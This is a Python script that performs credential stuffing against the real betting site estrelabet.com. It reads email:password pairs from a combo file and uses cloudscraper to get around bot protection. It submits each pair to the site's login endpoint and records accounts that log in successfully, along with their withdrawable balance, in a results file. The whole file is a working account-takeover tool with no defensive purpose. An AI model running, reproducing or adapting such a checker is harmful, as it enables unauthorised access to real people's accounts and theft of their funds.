import cloudscraper
import requests
import os

if not os.path.exists('Results'):
    os.makedirs('Results')

def check_login(login, password, valid_file_path):
    login_url = 'https://service.estrelabet.com/ajax/login'
    profile_url = 'https://service.estrelabet.com/ajax/profile/getData'
    
    scraper = cloudscraper.create_scraper()

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Referer": "https://www.estrelabet.com/",
        "Origin": "https://www.estrelabet.com",
        "Accept-Language": "en-US,en;q=0.9",
    }

    payload = {
        "emailId": login,
        "password": password
    }

    response = scraper.post(login_url, headers=headers, data=payload)

    if "The account and password you entered don" in response.text:
        with open('Results/Invalid.txt', 'a', encoding='utf-8') as f:
            f.write(f'{login}:{password} - Response.text: {response.text}\n')
        print(f'Invalid account: {login}:{password}')
    else:
        profile_response = scraper.get(profile_url, headers=headers)
        try:
            profile_data = profile_response.json()
            withdrawable_balance = profile_data['balanceDetails']['withdrawableBalance']

            with open(valid_file_path, 'a', encoding='utf-8') as f:
                f.write(f'Valid Account: {login}:{password} | Balance: {withdrawable_balance}\n')
            print(f'Valid Account: {login}:{password} | Balance: {withdrawable_balance}')
        except (ValueError, KeyError):
            pass

def main():
    combo_path = input("Enter the path to the combo file (e.g., combo.txt): ").strip()
    valid_file_name = input("Enter the file name to save valid accounts (e.g., Results/Valid.txt): ").strip()
    if not valid_file_name:
        valid_file_name = "Results/Valid.txt"

    with open(combo_path, 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            if line:
                try:
                    login, password = line.split(':')
                    check_login(login, password, valid_file_name)
                except ValueError:
                    print(f'Invalid format on line: {line}')

if __name__ == '__main__':
    main()